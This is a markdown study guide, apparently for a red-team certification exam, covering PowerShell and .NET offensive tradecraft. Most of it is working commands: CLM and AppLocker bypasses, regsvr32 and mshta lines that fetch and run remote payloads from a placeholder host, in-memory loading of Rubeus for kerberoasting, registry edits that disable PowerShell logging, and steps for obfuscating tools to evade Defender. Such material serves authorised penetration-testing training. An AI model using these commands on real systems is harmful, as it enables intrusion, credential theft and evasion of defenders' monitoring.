# Phase 13: PowerShell & .NET Tradecraft

> Operating in restricted PowerShell environments. This is explicitly on the CRTeamer syllabus.

---

## Constrained Language Mode (CLM)

CLM restricts PowerShell to only allow safe language elements — blocks `Add-Type`, arbitrary .NET calls, custom classes, etc. Triggered by AppLocker or WDAC policies.

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = restricted
# FullLanguage = unrestricted
```

### CLM Bypass Methods

```powershell
# Method 1: PowerShell v2 downgrade (if v2 installed)
powershell -version 2
$ExecutionContext.SessionState.LanguageMode  # often FullLanguage in v2

# Method 2: Use an unmanaged runspace (via .NET binary)
# Tools: p0wnedShell, PowerShdll — invoke PowerShell from a .exe that isn't powershell.exe
.\PowerShdll.dll rundll    # runs PowerShell in FullLanguage via rundll32

# Method 3: Use a script that only uses CLM-safe syntax
# Avoid: Add-Type, [System.Reflection.*], custom classes
# Use: basic cmdlets, Get-*, Set-*, Invoke-*

# Method 4: Create a .NET binary that calls PowerShell API
# Compile a C# wrapper — runs unrestricted PowerShell from inside a trusted process
```

---

## AppLocker Bypass

AppLocker blocks execution of unsigned scripts and binaries.

```powershell
# Check AppLocker rules
Get-AppLockerPolicy -Effective | Select -Expand RuleCollections

# Allowed paths (default AppLocker always-allowed):
# C:\Windows\* (including Temp, System32, etc.)
# C:\Program Files\*

# Copy your tools to allowed paths:
copy beacon.exe C:\Windows\Temp\beacon.exe  # Allowed by default
copy PowerView.ps1 C:\Windows\Temp\PowerView.ps1

# Use LOLBins for execution (all in allowed paths):
regsvr32 /s /n /u /i:http://<ip>/payload.sct scrobj.dll
mshta.exe http://<ip>/beacon.hta

# InstallUtil (allowed as signed MS binary):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U beacon.exe
```

---

## JEA (Just Enough Administration) Escape

JEA limits which PowerShell cmdlets a user can run in a remoting session.

```powershell
# Check what you can run in a JEA session
Get-Command  # lists allowed commands

# Common escape: if Invoke-Expression or similar is allowed
# Or: find a command that passes input to cmd.exe
# Example: some environments allow transcript logging commands that can be abused

# PSRemoting to JEA endpoint:
Enter-PSSession -ComputerName server -ConfigurationName JEAendpoint -Credential $cred

# Check language mode inside JEA:
$ExecutionContext.SessionState.LanguageMode

# If FullLanguage inside JEA → run PowerView, etc.
# If ConstrainedLanguage → try to find cmdlets that call external processes
```

---

## Loading .NET Assemblies In-Memory

```powershell
# After AMSI bypass — load any .NET tool without touching disk
$bytes = (New-Object Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')
[System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt /nowrap".Split())

# SharpHound in-memory:
$bytes = (New-Object Net.WebClient).DownloadData('http://<ip>/SharpHound.exe')
[System.Reflection.Assembly]::Load($bytes)
[SharpHound.Program]::Main("-c All --zip".Split())
```

---

## Bypass PowerShell Logging

```powershell
# Script Block Logging — disable via registry (needs admin)
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Module Logging — disable
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0

# Or: use Invisi-Shell (patches CLR hooks transparently)
.\RunWithRegistryNonAdmin.bat
# All subsequent PowerShell runs have logging disabled
```

---

## Offensive .NET — Tool Modification

The exam specifically mentions modifying open-source tools to evade detection.

```bash
# Download source of a detected tool (e.g., SharpHound)
git clone https://github.com/BloodHoundAD/SharpHound

# Common modifications to evade detection:
# 1. Rename namespaces, class names, method names
# 2. Remove or change string literals that are signatures
# 3. Add junk code to change binary hash
# 4. Change the AssemblyInfo (company, version, product name)
# 5. Use ConfuserEx to obfuscate the compiled binary

# ConfuserEx — .NET obfuscator
# Build your modified tool → run through ConfuserEx
# Settings: rename all, ctrl flow, anti-tamper, anti-debug

# Check result against Defender:
# Transfer to test Windows VM → right-click → scan
# Or: ThreatCheck https://github.com/rasta-mouse/ThreatCheck
.\ThreatCheck.exe -f SharpHound_modified.exe
```

---

## Exam Tip

The exam environment will likely have Defender enabled and may have AppLocker or PowerShell Constrained Language Mode. Your workflow:

1. Check language mode immediately after getting a shell
2. If CLM → use Invisi-Shell or execute-assembly via C2 instead of raw PowerShell
3. Load all tools via .NET reflection (in-memory) whenever possible
4. When Defender catches a tool → modify + recompile + retry

---

## Next Step → **Phase 14: Privilege Maintenance & Expansion** (`14-priv-maintenance.md`)
